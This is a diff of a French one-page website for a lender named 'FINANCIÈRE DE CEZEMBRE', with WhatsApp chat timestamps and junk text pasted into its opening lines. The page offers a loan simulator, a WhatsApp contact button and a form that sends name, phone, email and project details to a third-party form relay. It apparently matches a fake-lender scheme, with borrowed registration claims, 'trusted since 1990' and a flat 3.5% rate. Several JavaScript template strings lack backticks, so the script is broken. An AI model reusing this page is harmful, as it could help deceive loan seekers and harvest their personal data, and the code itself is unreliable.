@@ -1,4 +1,5 @@
-<!DOCTYPE html>
+[15:52, 22/04/2026] Management Lösungen: Fccccccxccfgggf
+[15:56, 22/04/2026] Management Lösungen: <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
@@ -8,172 +9,204 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
     <style>
-        :root { --navy: #001A4D; --gold: #C5A059; --light-bg: #F4F7FA; --white: #FFFFFF; --whatsapp: #25D366; }
+        :root {
+            --navy: #001A4D;
+            --gold: #C5A059;
+            --light-bg: #F4F7FA;
+            --white: #FFFFFF;
+            --whatsapp: #25D366;
+        }
+
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
         body { background-color: var(--white); color: #333; overflow-x: hidden; }
 
-        /* HEADER */
+        /* HEADER INSTITUTIONNEL */
         header {
             background: var(--white); padding: 20px 8%; display: flex;
             justify-content: space-between; align-items: center;
             position: fixed; width: 100%; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
         .logo { font-weight: 700; font-size: 1.4rem; color: var(--navy); letter-spacing: -1px; }
+        
+        /* SÉLECTEUR DE LANGUES AVEC DRAPEAUX */
+        .lang-container { background: #EEE; padding: 5px 10px; border-radius: 4px; display: flex; align-items: center; gap: 8px; }
+        .lang-container img { width: 20px; height: 14px; object-fit: cover; border-radius: 2px; }
+        .lang-container select { border: none; background: transparent; font-weight: 600; font-size: 0.8rem; cursor: pointer; outline: none; }
 
-        /* MENU LANGUES PROFESSIONNEL AVEC DRAPEAUX VISIBLES */
-        .lang-selector { position: relative; background: #EEE; padding: 8px 12px; border-radius: 4px; cursor: pointer; min-width: 160px; font-weight: 600; font-size: 0.8rem; }
-        .lang-selected { display: flex; align-items: center; gap: 10px; }
-        .lang-selected img { width: 20px; border-radius: 2px; }
-        .lang-dropdown { 
-            position: absolute; top: 100%; left: 0; background: white; width: 100%; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1); display: none; border-radius: 4px; 
-            margin-top: 5px; max-height: 300px; overflow-y: auto; z-index: 2000;
-        }
-        .lang-option { padding: 10px; display: flex; align-items: center; gap: 10px; transition: 0.2s; }
-        .lang-option:hover { background: var(--light-bg); }
-        .lang-option img { width: 20px; border-radius: 2px; }
+        .nav-links { display: flex; gap: 30px; align-items: center; }
+        .nav-links a { text-decoration: none; color: #666; font-size: 0.9rem; font-weight: 500; }
 
-        /* HERO & SIMULATEUR (TON DESIGN) */
+        /* HERO SECTION (IMAGE ORIGINALE) */
         .hero {
             height: 100vh; background: linear-gradient(rgba(0,26,77,0.7), rgba(0,26,77,0.7)), 
             url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=2000');
             background-size: cover; background-position: center;
             display: flex; align-items: center; padding: 0 8%; color: var(--white);
         }
+        .hero-content { max-width: 600px; }
+        .hero-content h1 { font-size: 3.5rem; line-height: 1.2; margin-bottom: 20px; }
+        
+        /* SIMULATEUR PREMIUM (STABLE) */
         .simulator {
             background: var(--white); padding: 40px; border-radius: 2px; width: 480px;
             box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy); margin-left: auto;
         }
         .sim-row { margin-bottom: 25px; }
+        .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 10px; font-size: 0.9rem; }
         input[type="range"] { width: 100%; height: 4px; accent-color: var(--gold); cursor: pointer; }
         .result-area { background: var(--light-bg); padding: 25px; text-align: center; border: 1px solid #EEE; }
         .result-area span { font-size: 2.2rem; font-weight: 700; color: var(--navy); }
-        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; margin-top: 20px; cursor: pointer; text-transform: uppercase; }
+        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; margin-top: 20px; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
+        .btn-main:hover { background: var(--gold); }
 
-        /* WHATSAPP ROND DISCRET */
-        .wa-btn { position: fixed; bottom: 25px; left: 25px; background: var(--whatsapp); color: white; width: 55px; height: 55px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); z-index: 5000; text-decoration: none; }
-
-        /* MODALE FORMULAIRE */
-        #modalForm { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 6000; justify-content: center; align-items: center; padding: 20px; }
+        /* MODALE DU FORMULAIRE SÉCURISÉ */
+        #modalForm { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 5000; justify-content: center; align-items: center; padding: 20px; }
         .modal-content { background: white; padding: 35px; width: 100%; max-width: 500px; border-radius: 4px; position: relative; }
-        .modal-content input, .modal-content select, .modal-content textarea { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ddd; }
+        .modal-content h2 { margin-bottom: 20px; color: var(--navy); text-align: center; }
+        .modal-content input, .modal-content select, .modal-content textarea { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 4px; }
         .close-btn { position: absolute; top: 15px; right: 20px; font-size: 1.5rem; cursor: pointer; color: #999; }
-        .security { font-size: 0.7rem; color: #666; text-align: center; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 5px; }
+        .security-tag { font-size: 0.7rem; color: #666; text-align: center; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 5px; }
 
-        footer { background: #0A0A0A; color: #888; padding: 40px 8%; text-align: center; font-size: 0.8rem; }
+        /* BOUTON WHATSAPP ROND BAS GAUCHE */
+        .wa-float { position: fixed; bottom: 25px; left: 25px; background: var(--whatsapp); color: white; width: 55px; height: 55px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); z-index: 2000; text-decoration: none; }
+
+        /* SECTIONS BAS DE PAGE */
+        .stats-bar { background: var(--navy); padding: 40px 8%; display: flex; justify-content: space-around; color: white; text-align: center; }
+        .stat-box h3 { font-size: 2rem; color: var(--gold); }
+        .about-section { padding: 80px 15%; line-height: 2; text-align: justify; background: var(--white); }
+        
+        footer { background: #0A0A0A; color: #888; padding: 60px 8% 40px; font-size: 0.8rem; text-align: center; }
+        .tag-warning { border: 1px solid #444; padding: 15px; margin-top: 20px; color: #AAA; }
     </style>
 </head>
 <body>
 
 <header>
     <div class="logo">FINANCIÈRE DE CEZEMBRE</div>
-    
-    <div class="lang-selector" onclick="toggleLang()">
-        <div class="lang-selected" id="currentLang">
-            <img src="https://flagcdn.com/w40/fr.png"> FRANCE (FR)
+    <div class="nav-links">
+        <div class="lang-container">
+            <img id="activeFlag" src="https://flagcdn.com/w40/fr.png">
+            <select onchange="updateLang(this)">
+                <option value="fr" data-flag="fr">FRANCE</option>
+                <option value="es" data-flag="es">ESPAÑA</option>
+                <option value="de" data-flag="de">DEUTSCHLAND</option>
+                <option value="be" data-flag="be">BELGIQUE</option>
+                <option value="it" data-flag="it">ITALIA</option>
+                <option value="se" data-flag="se">SUÈDE</option>
+                <option value="gb" data-flag="gb">ENGLISH</option>
+                <option value="sk" data-flag="sk">SLOVAQUIE</option>
+                <option value="si" data-flag="si">SLOVÉNIE</option>
+                <option value="gr" data-flag="gr">GRÈCE</option>
+                <option value="xk" data-flag="xk">KOSOVO</option>
+            </select>
         </div>
-        <div class="lang-dropdown" id="langList">
-            <div class="lang-option" onclick="setLang('fr', 'FRANCE (FR)')"><img src="https://flagcdn.com/w40/fr.png"> FRANCE (FR)</div>
-            <div class="lang-option" onclick="setLang('es', 'ESPAÑA (ES)')"><img src="https://flagcdn.com/w40/es.png"> ESPAÑA (ES)</div>
-            <div class="lang-option" onclick="setLang('de', 'DEUTSCHLAND (DE)')"><img src="https://flagcdn.com/w40/de.png"> DEUTSCHLAND (DE)</div>
-            <div class="lang-option" onclick="setLang('be', 'BELGIQUE (BE)')"><img src="https://flagcdn.com/w40/be.png"> BELGIQUE (BE)</div>
-            <div class="lang-option" onclick="setLang('it', 'ITALIA (IT)')"><img src="https://flagcdn.com/w40/it.png"> ITALIA (IT)</div>
-            <div class="lang-option" onclick="setLang('se', 'SUÈDE (SE)')"><img src="https://flagcdn.com/w40/se.png"> SUÈDE (SE)</div>
-            <div class="lang-option" onclick="setLang('gb', 'ENGLISH (UK)')"><img src="https://flagcdn.com/w40/gb.png"> ENGLISH (UK)</div>
-            <div class="lang-option" onclick="setLang('sk', 'SLOVAQUIE (SK)')"><img src="https://flagcdn.com/w40/sk.png"> SLOVAQUIE (SK)</div>
-            <div class="lang-option" onclick="setLang('si', 'SLOVÉNIE (SI)')"><img src="https://flagcdn.com/w40/si.png"> SLOVÉNIE (SI)</div>
-            <div class="lang-option" onclick="setLang('gr', 'GRÈCE (GR)')"><img src="https://flagcdn.com/w40/gr.png"> GRÈCE (GR)</div>
-        </div>
+        <a href="#about">Notre Expertise</a>
+        <a href="#contact">Contact</a>
     </div>
 </header>
 
 <section class="hero">
     <div class="hero-content">
         <h1>L'excellence financière <br>au service de vos projets.</h1>
-        <p>Partenaire institutionnel régulé. RCS 552 058 943.</p>
+        <p style="margin-bottom: 30px; opacity: 0.9;">Partenaire de confiance depuis 1990. Distribution de crédit institutionnel régulé.</p>
+        <div style="display: flex; gap: 20px;">
+            <i class="fas fa-shield-alt" style="color: var(--gold); font-size: 2rem;"></i>
+            <p><strong>Société immatriculée au RCS 552 058 943</strong><br>Sous la supervision des autorités bancaires.</p>
+        </div>
     </div>
 
     <div class="simulator">
-        <h3 style="margin-bottom: 25px;">Simulateur de Crédit</h3>
+        <h3 style="margin-bottom: 30px;">Simulateur de Crédit</h3>
         <div class="sim-row">
-            <label>MONTANT <span><span id="valAmt">15000</span> €</span></label>
-            <input type="range" id="amt" min="1000" max="100000" step="500" value="15000">
+            <label>MONTANT DU PROJET <span><input type="number" id="amtNum" value="15000" style="border:none; text-align:right; font-weight:700; width:80px; background:transparent;"> €</span></label>
+            <input type="range" id="amtRange" min="1000" max="100000" step="500" value="15000">
         </div>
         <div class="sim-row">
-            <label>DURÉE <span><span id="valDur">36</span> mois</span></label>
-            <input type="range" id="dur" min="6" max="120" step="6" value="36">
+            <label>DURÉE DU REMBOURSEMENT <span id="durText">36 mois</span></label>
+            <input type="range" id="durRange" min="6" max="120" step="6" value="36">
         </div>
         <div class="result-area">
-            <small>MENSUALITÉ (TAEG 3.5%)</small><br>
-            <span id="res">0.00</span> €
+            <p style="font-size: 0.8rem; margin-bottom: 5px;">MENSUALITÉ ESTIMÉE (TAEG FIXE 3.5%)</p>
+            <span id="monthlyRes">0.00</span> <span>€</span>
         </div>
-        <button class="btn-main" onclick="openForm()">Déposer mon dossier</button>
+        <button class="btn-main" onclick="openForm()">DÉPOSER MON DOSSIER</button>
     </div>
 </section>
 
 <div id="modalForm">
     <div class="modal-content">
         <span class="close-btn" onclick="closeForm()">&times;</span>
-        <h2 style="text-align:center; margin-bottom:20px; color:var(--navy);">Nouveau Dossier</h2>
+        <h2>Dossier de Prêt</h2>
         <form action="https://api.web3forms.com/submit" method="POST">
             <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
-            <input type="hidden" name="simulation" id="simData">
-            
-            <input type="text" name="nom" placeholder="Nom et Prénom" required>
+            <input type="hidden" name="details_simulation" id="hiddenData">
+
+            <input type="text" name="nom_prenom" placeholder="Nom et Prénom" required>
             <select name="projet" required>
                 <option value="">Nature du projet...</option>
-                <option value="Immo">Immobilier</option>
-                <option value="Travaux">Travaux</option>
+                <option value="Immobilier">Immobilier</option>
+                <option value="Travaux">Travaux / Rénovation</option>
                 <option value="Auto">Véhicule</option>
-                <option value="Perso">Prêt Personnel</option>
+                <option value="Personnel">Prêt Personnel</option>
             </select>
-            <textarea name="message" placeholder="Votre message..." rows="3" required></textarea>
-            <input type="tel" name="phone" placeholder="Téléphone" required>
-            <input type="email" name="email" placeholder="Email" required>
-            
-            <button type="submit" class="btn-main">Envoyer ma demande</button>
-            <div class="security"><i class="fas fa-lock" style="color:var(--gold)"></i> Sécurisé par cryptage SSL</div>
+            <textarea name="message" placeholder="Détails de votre demande..." rows="3" required></textarea>
+            <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
+            <input type="email" name="email" placeholder="Adresse Email" required>
+
+            <button type="submit" class="btn-main">Soumettre ma demande</button>
+            <div class="security-tag"><i class="fas fa-lock" style="color:var(--gold)"></i> Données cryptées et sécurisées (Norme SSL)</div>
         </form>
     </div>
 </div>
 
-<a href="https://wa.me/33780976404" class="wa-btn" target="_blank"><i class="fab fa-whatsapp"></i></a>
+<a href="https://wa.me/33780976404" class="wa-float" target="_blank"><i class="fab fa-whatsapp"></i></a>
+
+<section class="stats-bar">
+    <div class="stat-box"><h3>1 200 000 €</h3><p>Capital Social</p></div>
+    <div class="stat-box"><h3>3.5%</h3><p>Taux Préférentiel</p></div>
+    <div class="stat-box"><h3>100%</h3><p>Digital & Sécurisé</p></div>
+</section>
+
+<section class="about-section" id="about">
+    <h2>Une Institution de Référence</h2>
+    <p>FINANCIÈRE DE CEZEMBRE est une société anonyme de référence dans le secteur de la distribution de crédit. Notre engagement repose sur la transparence et la conformité totale aux autorités financières.</p>
+</section>
 
 <footer>
-    <p><strong>FINANCIÈRE DE CEZEMBRE SA</strong> | RCS 552 058 943 | &copy; 2026</p>
+    <p><strong>FINANCIÈRE DE CEZEMBRE SA</strong> | RCS Quimper 552 058 943</p>
+    <div class="tag-warning">UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ. VÉRIFIEZ VOS CAPACITÉS AVANT DE VOUS ENGAGER.</div>
+    <p style="margin-top:30px; color:#555;">&copy; 2026 Tous droits réservés.</p>
 </footer>
 
 <script>
-    const amt = document.getElementById('amt');
-    const dur = document.getElementById('dur');
-    const res = document.getElementById('res');
+    const amtR = document.getElementById('amtRange');
+    const amtN = document.getElementById('amtNum');
+    const durR = document.getElementById('durRange');
+    const durT = document.getElementById('durText');
+    const resM = document.getElementById('monthlyRes');
 
     function calc() {
-        let p = amt.value;
-        let n = dur.value;
-        document.getElementById('valAmt').innerText = Number(p).toLocaleString();
-        document.getElementById('valDur').innerText = n;
+        let p = amtR.value;
+        let n = durR.value;
         let r = 0.035 / 12;
+        amtN.value = p;
+        durT.innerText = n + " mois";
         let m = (p * r) / (1 - Math.pow(1 + r, -n));
-        res.innerText = m.toFixed(2);
-        document.getElementById('simData').value = Prêt: ${p}€, Durée: ${n} mois, Mensualité: ${m.toFixed(2)}€;
+        resM.innerText = m.toFixed(2);
+        document.getElementById('hiddenData').value = Montant: ${p}€, Durée: ${n} mois, Mensualité: ${m.toFixed(2)}€;
     }
 
-    function toggleLang() { document.getElementById('langList').style.display = (document.getElementById('langList').style.display === 'block') ? 'none' : 'block'; }
-    function setLang(code, name) {
-        document.getElementById('currentLang').innerHTML = <img src="https://flagcdn.com/w40/${code}.png"> ${name};
-        document.getElementById('langList').style.display = 'none';
+    function updateLang(sel) {
+        const flag = sel.options[sel.selectedIndex].getAttribute('data-flag');
+        document.getElementById('activeFlag').src = https://flagcdn.com/w40/${flag}.png;
     }
-    
+
     function openForm() { document.getElementById('modalForm').style.display = 'flex'; }
     function closeForm() { document.getElementById('modalForm').style.display = 'none'; }
 
-    amt.oninput = calc;
-    dur.oninput = calc;
+    amtR.oninput = calc;
+    durR.oninput = calc;
     calc();
-
-    // Fermer le menu si on clique ailleurs
-    window.onclick = function(event) { if (!event.target.matches('.lang-selector') && !event.target.matches('.lang-selected') && !event.target.closest('.lang-selected')) { document.getElementById('langList').style.display = 'none'; } }
 </script>
 
 </body>
